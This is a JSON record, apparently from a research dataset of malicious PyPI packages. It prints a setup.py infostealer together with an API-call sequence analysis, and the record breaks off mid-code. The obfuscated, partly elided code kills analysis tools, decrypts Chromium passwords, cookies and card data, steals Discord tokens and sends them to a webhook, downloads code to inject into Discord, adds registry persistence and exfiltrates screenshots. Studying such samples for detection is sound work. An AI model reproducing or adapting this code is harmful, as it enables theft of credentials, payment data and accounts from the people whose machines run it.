[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/v4pe-5/v4pe-5/setup.py",
    "code_snippet": "import subprocess\nimport ctypes\nimport os\nimport shutil\nimport re\nimport psutil\nimport requests\nimport base64\nimport json\nfrom Crypto.Cipher import AES\nfrom discord import Embed, SyncWebhook, File\nfrom win32crypt import CryptUnprotectData\nimport uuid\nimport wmi\nfrom PIL import ImageGrab\nimport sqlite3\nfrom pathlib import Path\nfrom zipfile import ZipFile\n\n# --- Malicious Data Exfiltration, Credential/Token Stealing, Persistence, and Injection ---\n\n# 1. Anti-debugging, anti-analysis, and process killing\nclass AntiDebug:\n    def __init__(self):\n        if self.checks():\n            sys.exit(int())\n    def checks(self):\n        # ... (blacklists, process killing, network/system checks)\n        self.check_process()\n        if self.get_network():\n            debugging = True\n        if self.get_system():\n            debugging = True\n        return debugging\n    def check_process(self):\n        for proc in psutil.process_iter():\n            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n    def get_network(self):\n        ip = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        mac = base64.b64decode(zlib.decompress(b'x...')).decode().join(re.findall(base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode() % uuid.getnode()))\n        if ip in self.blackListedIPS:\n            return True\n        if mac in self.blackListedMacs:\n            return True\n    def get_system(self):\n        try:\n            hwid = subprocess.check_output(base64.b64decode(zlib.decompress(b'x...')).decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode(base64.b64decode(zlib.decompress(b'x...')).decode()).split(base64.b64decode(zlib.decompress(b'x...')).decode())[int.from_bytes(map(lambda O, i: 997 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)].strip()\n        except:\n            hwid = base64.b64decode(zlib.decompress(b'x...')).decode()\n        username = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        hostname = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):\n            if hwid in i or username in i or hostname in i:\n                return True\n\n# 2. Chromium/Opera browser credential, cookie, history, download, and credit card theft\nclass Chromium:\n    def __init__(self):\n        # ... (find browser paths, enumerate profiles)\n        for _, path in self.browsers.items():\n            if not os.path.exists(path):\n                continue\n            self.master_key = self.get_master_key(base64.b64decode(zlib.decompress(b'x...')).decode().format(path))\n            if not self.master_key:\n                continue\n            for profile in self.profiles:\n                if not os.path.exists(path + base64.b64decode(zlib.decompress(b'x...')).decode() + profile):\n                    continue\n                operations = [self.get_login_data, self.get_cookies, self.get_web_history, self.get_downloads, self.get_credit_cards]\n                for operation in operations:\n                    try:\n                        operation(path, profile)\n                    except Exception:\n                        pass\n    def get_master_key(self, path):\n        if not os.path.exists(path):\n            return\n        if base64.b64decode(zlib.decompress(b'x...')).decode() not in open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()).read():\n            return\n        with open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[base64.b64decode(zlib.decompress(b'x...')).decode()][base64.b64decode(zlib.decompress(b'x...')).decode()])\n        master_key = master_key[int.from_bytes(map(lambda O, i: 471 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):]\n        master_key = CryptUnprotectData(master_key, None, None, None, int.from_bytes(map(lambda O, i: 371 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))[int.from_bytes(map(lambda O, i: 852 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]\n        return master_key\n    def decrypt_password(self, buff, master_key):\n        iv = buff[int.from_bytes(map(lambda O, i: 531 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):int.from_bytes(map(lambda O, i: 409 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]\n        payload = buff[int.from_bytes(map(lambda O, i: 993 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-int.from_bytes(map(lambda O, i: 701 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)].decode()\n        return decrypted_pass\n    def get_login_data(self, path, profile):\n        # ... (copy, open, and extract credentials from browser database, decrypt, and append to global list)\n        pass\n    def get_cookies(self, path, profile):\n        # ... (copy, open, and extract cookies from browser database, decrypt, and append to global list)\n        pass\n    def get_web_history(self, path, profile):\n        # ... (copy, open, and extract web history from browser database, append to global list)\n        pass\n    def get_downloads(self, path, profile):\n        # ... (copy, open, and extract downloads from browser database, append to global list)\n        pass\n    def get_credit_cards(self, path, profile):\n        # ... (copy, open, and extract credit cards from browser database, decrypt, and append to global list)\n        pass\n\n# 3. Discord token extraction and exfiltration\nclass extract_tokens:\n    def __init__(self):\n        # ... (set up paths, regex, extract tokens)\n        self.extract()\n    def extract(self):\n        # ... (search for Discord tokens in various app data folders, decrypt, validate, and collect tokens)\n        pass\n    def validate_token(self, token):\n        r = requests.get(self.base_url, headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token})\n        if r.status_code == int.from_bytes(map(lambda O, i: 858 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):\n            return True\n        return False\n    def decrypt_val(self, buff, master_key):\n        # ... (decrypt Discord token using master key)\n        pass\n    def get_master_key(self, path):\n        # ... (extract and decrypt master key from Local State)\n        pass\n\nclass upload_tokens:\n    def __init__(self, webhook):\n        self.tokens = extract_tokens().tokens\n        self.webhook = SyncWebhook.from_url(webhook)\n    def upload(self):\n        if not self.tokens:\n            return\n        for token in self.tokens:\n            user = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode(), headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token}).json()\n            # ... (collect user info, badges, payment, guilds, friends, gift codes, etc.)\n            embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode().format(username, user_id), color=int.from_bytes(map(lambda O, i: 719 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))\n            # ... (add fields, send to webhook)\n            self.webhook.send(embed=embed, username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n\n# 4. Injection into Discord installations (malicious code injection for persistence and further compromise)\nclass Injection:\n    def __init__(self, webhook):\n        self.appdata = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        self.discord_dirs = [self.appdata + base64.b64decode(zlib.decompress(b'x...')).decode(), ...]\n        self.code = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        for proc in psutil.process_iter():\n            if base64.b64decode(zlib.decompress(b'x...')).decode() in proc.name().lower():\n                proc.kill()\n        for dir in self.discord_dirs:\n            if not os.path.exists(dir):\n                continue\n            if self.get_core(dir) is not None:\n                with open(self.get_core(dir)[int.from_bytes(map(lambda O, i: 286 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)] + base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n                    f.write(self.code.replace(base64.b64decode(zlib.decompress(b'x...')).decode(), self.get_core(dir)[int.from_bytes(map(lambda O, i: 313 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]).replace(base64.b64decode(zlib.decompress(b'x...')).decode(), webhook))\n                    self.start_discord(dir)\n    def get_core(self, dir):\n        # ... (locate Discord core files for injection)\n        pass\n    def start_discord(self, dir):\n        # ... (restart Discord to load injected code)\n        pass\n\n# 5. Persistence via startup folder and registry modification\nclass Startup:\n    def __init__(self):\n        self.working_dir = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode()) + base64.b64decode(zlib.decompress(b'x...')).decode()\n        if self.check_self():\n            return\n        self.mkdir()\n        self.write_stub()\n        self.regedit()\n    def check_self(self):\n        if os.path.realpath(sys.executable) == self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode():\n            return True\n        return False\n    def mkdir(self):\n        if not os.path.isdir(self.working_dir):\n            os.mkdir(self.working_dir)\n        else:\n            shutil.rmtree(self.working_dir)\n            os.mkdir(self.working_dir)\n    def write_stub(self):\n        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode())\n        with open(file=base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir), mode=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            f.write(base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir))\n    def regedit(self):\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n\n# 6. System information and screenshot exfiltration\nclass SystemInfo:\n    def __init__(self, webhook):\n        webhook = SyncWebhook.from_url(webhook)\n        embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode(), color=int.from_bytes(map(lambda O, i: 664 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))\n        # ... (add fields for user, system, disk, network, wifi, etc.)\n        image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)\n        image.save(base64.b64decode(zlib.decompress(b'x...')).decode())\n        embed.set_image(url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        try:\n            webhook.send(embed=embed, file=File(base64.b64decode(zlib.decompress(b'x...')).decode(), filename=base64.b64decode(zlib.decompress(b'x...')).decode()), username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        except:\n            pass\n        if os.path.exists(base64.b64decode(zlib.decompress(b'x...')).decode()):\n            os.remove(base64.b64decode(zlib.decompress(b'x...')).decode())\n\n# 7. Main execution logic to run all malicious modules\n\ndef main():\n    funcs = [AntiDebug, Browsers, DiscordToken, Injection, Startup, SystemInfo]\n    for func in funcs:\n        if __CONFIG__[func.__name__.lower()]:\n            try:\n                if func.__init__.__code__.co_argcount == int.from_bytes(map(lambda O, i: 453 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):\n                    func(__CONFIG__[base64.b64decode(zlib.decompress(b'x...')).decode()])\n                else:\n                    func()\n            except Exception as e:\n                print(base64.b64decode(zlib.decompress(b'x...')).decode().format(func.__name__, e))\n\nif __name__ == base64.b64decode(zlib.decompress(b'x...')).decode():\n    main()\n",
    "pattern_analysis": {
      "api_sequence": [
        "psutil.process_iter",
        "psutil.Process.name",
        "psutil.Process.kill",
        "requests.get",
        "base64.b64decode",
        "zlib.decompress",
        "uuid.getnode",
        "re.findall",
        "subprocess.check_output",
        "os.getenv",
        "os.path.exists",
        "open",
        "json.loads",
        "base64.b64decode",
        "win32crypt.CryptUnprotectData",
        "AES.new",
        "AES.new.decrypt",
        "requests.get",
        "requests.get",
        "requests.get",
        "SyncWebhook.from_url",
        "SyncWebhook.send",
        "os.getenv",
        "psutil.process_iter",
        "psutil.Process.name",
        "psutil.Process.kill",
        "os.path.exists",
        "open",
        "open.write",
        "os.path.exists",
        "os.remove",
        "os.getenv",
        "os.path.isdir",
        "os.mkdir",
        "shutil.rmtree",
        "shutil.copy2",
        "os.path.realpath",
        "subprocess.run",
        "subprocess.run",
        "SyncWebhook.from_url",
        "Embed",
        "ImageGrab.grab",
        "Image.save",
        "Embed.set_image",
        "SyncWebhook.send",
        "File",
        "os.path.exists",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "psutil.process_iter()",
        "psutil.Process.name()",
        "psutil.Process.kill()",
        "requests.get(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "base64.b64decode(zlib.decompress(b'x...')).decode()",
        "zlib.decompress(b'x...')",
        "uuid.getnode()",
        "re.findall(base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode() % uuid.getnode())",
        "subprocess.check_output(base64.b64decode(zlib.decompress(b'x...')).decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE)",
        "os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "os.path.exists(path)",
        "open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode())",
        "json.loads(c)",
        "base64.b64decode(local_state[base64.b64decode(zlib.decompress(b'x...')).decode()][base64.b64decode(zlib.decompress(b'x...')).decode()])",
        "win32crypt.CryptUnprotectData(master_key, None, None, None, int.from_bytes(...))",
        "AES.new(master_key, AES.MODE_GCM, iv)",
        "AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)",
        "requests.get(self.base_url, headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token})",
        "requests.get(base64.b64decode(zlib.decompress(b'x...')).decode(), headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token})",
        "requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text",
        "SyncWebhook.from_url(webhook)",
        "SyncWebhook.send(embed=embed, username=..., avatar_url=...)",
        "os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "psutil.process_iter()",
        "psutil.Process.name()",
        "psutil.Process.kill()",
        "os.path.exists(dir)",
        "open(self.get_core(dir)[...] + base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode())",
        "open.write(self.code.replace(...))",
        "os.path.exists(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "os.remove(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "os.path.isdir(self.working_dir)",
        "os.mkdir(self.working_dir)",
        "shutil.rmtree(self.working_dir)",
        "shutil.copy2(os.path.realpath(sys.executable), self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode())",
        "os.path.realpath(sys.executable)",
        "subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)",
        "subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)",
        "SyncWebhook.from_url(webhook)",
        "Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode(), color=int.from_bytes(...))",
        "ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)",
        "Image.save(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "Embed.set_image(url=base64.b64decode(zlib.decompress(b'x...')).decode())",
        "SyncWebhook.send(embed=embed, file=File(base64.b64decode(zlib.decompress(b'x...')).decode(), filename=base64.b64decode(zlib.decompress(b'x...')).decode()), username=..., avatar_url=...)",
        "File(base64.b64decode(zlib.decompress(b'x...')).decode(), filename=base64.b64decode(zlib.decompress(b'x...')).decode())",
        "os.path.exists(base64.b64decode(zlib.decompress(b'x...')).decode())",
        "os.remove(base64.b64decode(zlib.decompress(b'x...')).decode())"
      ],
      "mapped_sequence": [
        {
          "api_name": "psutil.process_iter",
          "id": "iterate_processes",
          "description": "Iterates over all running processes",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.name",
          "id": "get_process_name",
          "description": "Retrieves process name as string",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.kill",
          "id": "terminate_process",
          "description": "Terminates the process",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "zlib.decompress",
          "id": "decompress_data_zlib",
          "description": "Decompresses zlib-compressed data",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "compression_decompression"
        },
        {
          "api_name": "uuid.getnode",
          "id": "get_hardware_address",
          "description": "Retrieves hardware address as 48-bit integer",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "AES.new",
          "id": "init_aes_cipher",
          "description": "Initializes AES cipher with provided key",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "discord.SyncWebhook.from_url",
          "id": "create_discord_webhook",
          "description": "Creates Discord webhook object from URL and session",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.SyncWebhook.send",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "psutil.process_iter",
          "id": "iterate_processes",
          "description": "Iterates over all running processes",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.name",
          "id": "get_process_name",
          "description": "Retrieves process name as string",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.kill",
          "id": "terminate_process",
          "description": "Terminates the process",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.realpath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "subprocess.run",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.run",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "discord.SyncWebhook.from_url",
          "id": "create_discord_webhook",
          "description": "Creates Discord webhook object from URL and session",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Embed",
          "id": "create_discord_embed",
          "description": "Creates Discord embed object with specified content",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "PIL.ImageGrab.grab",
          "id": "capture_entire_screen",
          "description": "Captures screenshot of the entire screen",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "screen_capture"
        },
        {
          "api_name": "PIL.Image.save",
          "id": "save_image_file",
          "description": "Saves image to file in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "discord.Embed.set_image",
          "id": "set_discord_thumbnail",
          "description": "Sets thumbnail image for Discord embed",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "discord.SyncWebhook.send",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "discord.File",
          "id": "create_discord_file_path",
          "description": "Creates Discord file object from specified path",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import psutil\nimport requests\nimport base64\nimport zlib\nimport uuid\nimport re\nimport subprocess\nimport os\nimport json\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nfrom discord import Embed, SyncWebhook, File\nfrom PIL import ImageGrab\nimport shutil\n\n# --- Anti-debugging, process killing ---\nclass AntiDebug:\n    def __init__(self):\n        if self.checks():\n            sys.exit(int())\n    def checks(self):\n        self.check_process()\n        if self.get_network():\n            debugging = True\n        if self.get_system():\n            debugging = True\n        return debugging\n    def check_process(self):\n        for proc in psutil.process_iter():\n            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n    def get_network(self):\n        ip = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        mac = base64.b64decode(zlib.decompress(b'x...')).decode().join(re.findall(base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode() % uuid.getnode()))\n        if ip in self.blackListedIPS:\n            return True\n        if mac in self.blackListedMacs:\n            return True\n    def get_system(self):\n        try:\n            hwid = subprocess.check_output(base64.b64decode(zlib.decompress(b'x...')).decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode(base64.b64decode(zlib.decompress(b'x...')).decode()).split(base64.b64decode(zlib.decompress(b'x...')).decode())[int.from_bytes(...)]\n        except:\n            hwid = base64.b64decode(zlib.decompress(b'x...')).decode()\n        username = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        hostname = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):\n            if hwid in i or username in i or hostname in i:\n                return True\n\n# --- Chromium credential/cookie theft ---\nclass Chromium:\n    def get_master_key(self, path):\n        if not os.path.exists(path):\n            return\n        if base64.b64decode(zlib.decompress(b'x...')).decode() not in open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()).read():\n            return\n        with open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[base64.b64decode(zlib.decompress(b'x...')).decode()][base64.b64decode(zlib.decompress(b'x...')).decode()])\n        master_key = master_key[int.from_bytes(...) :]\n        master_key = CryptUnprotectData(master_key, None, None, None, int.from_bytes(...))[int.from_bytes(...)]\n        return master_key\n    def decrypt_password(self, buff, master_key):\n        iv = buff[int.from_bytes(...):int.from_bytes(...)]\n        payload = buff[int.from_bytes(...):]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-int.from_bytes(...)].decode()\n        